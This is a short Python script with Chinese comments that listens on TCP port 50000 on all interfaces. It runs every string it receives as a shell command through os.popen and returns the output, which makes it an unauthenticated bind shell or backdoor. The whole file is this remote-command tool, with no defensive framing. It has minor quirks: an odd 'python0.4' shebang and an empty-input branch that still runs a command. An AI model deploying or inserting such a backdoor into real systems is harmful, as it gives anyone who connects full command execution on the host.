#!/usr/bin/python0.4
# _*_ coding:utf-8 _*_

import socket
import time
import os
host=''
port=50000
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((host,port))
s.listen(2)
while 1:
    conn,addr=s.accept()

    print('我被lian接了，IP地址是：',addr)
    
    while 1:
        data=conn.recv(4096).decode('utf-8')
        print('接收到数据：',data)
        if not data:
            #break
            time.sleep(2)
        #os.system(data)         #do os command统
        cmd=os.popen(data)
        result=cmd.read()
        print(result)
        conn.sendall(result.encode('utf-8'))
conn.close()
